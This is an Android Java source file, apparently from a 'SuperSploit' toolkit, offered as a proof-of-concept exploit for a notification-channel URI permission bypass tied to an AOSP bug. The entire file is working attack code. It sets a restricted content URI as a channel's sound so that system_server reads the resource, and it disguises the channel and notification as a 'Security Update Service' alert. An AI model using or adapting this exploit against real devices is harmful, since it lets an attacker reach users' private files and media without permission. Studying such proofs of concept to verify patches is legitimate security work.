package org.supersploit.stub;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.AudioAttributes;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;

/**
 * Proof of Concept: Android Notification Uri Permission Bypass
 * Addresses Bug 337775777 (AOSP fb8f76eca9079c34af3e14ee0a58bc10a580ec42)
 */
public class NotificationBypass extends Service {

    private static final String TAG = "SuperSploitPoC";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String targetUriStr = intent.getStringExtra("TARGET_URI");
        if (targetUriStr == null) {
            targetUriStr = "content://com.android.providers.media.documents/document/image%3A1";
        }
        
        triggerBypass(targetUriStr);
        return START_NOT_STICKY;
    }

    private void triggerBypass(String uriString) {
        Log.i(TAG, "[*] Attempting URI Bypass with: " + uriString);
        
        try {
            Uri sensitiveUri = Uri.parse(uriString);
            String channelId = "exploit_channel_" + System.currentTimeMillis();
            
            // 1. Create the channel
            NotificationChannel channel = new NotificationChannel(
                    channelId, 
                    "Security Update Service", 
                    NotificationManager.IMPORTANCE_HIGH
            );

            // 2. Set the sound to the restricted URI
            AudioAttributes audioAttributes = new AudioAttributes.Builder()
                    .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                    .setUsage(AudioAttributes.USAGE_NOTIFICATION)
                    .build();
            
            channel.setSound(sensitiveUri, audioAttributes);

            // 3. Register the channel. 
            // On unpatched systems, this succeeds even if we don't have URI access.
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            nm.createNotificationChannel(channel);
            
            Log.i(TAG, "[+] SUCCESS: Notification channel created with restricted URI.");
            Log.i(TAG, "[*] On unpatched systems, system_server just accessed the resource for us.");

            // 4. Trigger a notification to force playback/access
            Notification notification = new Notification.Builder(this, channelId)
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .setContentTitle("System Alert")
                    .setContentText("Security verification in progress...")
                    .setAutoCancel(true)
                    .build();

            nm.notify(1337, notification);
            
        } catch (SecurityException e) {
            Log.e(TAG, "[-] FAILURE: SecurityException thrown. Device is likely PATCHED.");
            Log.e(TAG, "[-] Error: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "[-] Unexpected error: " + e.getMessage());
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
